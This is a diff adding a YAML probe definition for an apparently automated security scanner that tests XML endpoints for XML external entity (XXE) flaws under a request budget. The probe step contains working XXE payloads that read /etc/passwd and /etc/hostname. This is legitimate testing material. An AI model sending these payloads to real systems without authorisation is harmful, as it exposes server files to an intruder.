@@ -1,0 +1,38 @@
+id: xxe_classic
+attack_class: xxe
+preconditions:
+  content_type_contains_any: [application/xml, text/xml, application/soap+xml]
+  or_path_extension_any: [.docx, .xlsx, .svg, .xsd]
+steps:
+  - id: baseline_request
+    action: send_baseline
+    identity_selector: none
+    probe_template:
+      mode: bounded_probe
+      template: xml_body_baseline
+    expected_signal: baseline XML response captured
+    observe_only: true
+    max_attempts: 1
+  - id: xxe_file_probe
+    action: send_xxe_probe
+    identity_selector: none
+    probe_template:
+      mode: bounded_probe
+      template: xml_body_inject
+      variables:
+        payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+        alt_payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>'
+    expected_signal: unix file content or XML parser error in response
+    validator: xxe_classic_validator
+    max_attempts: 1
+validators:
+  xxe_classic_validator:
+    signal: file_content_hit
+  xxe_error_validator:
+    signal: parser_error
+safety_budget:
+  max_requests: 2
+  max_attempts_per_step: 1
+  rate_limit_rps: 0.5
+  scope: current_endpoint
+  proof_gate: default
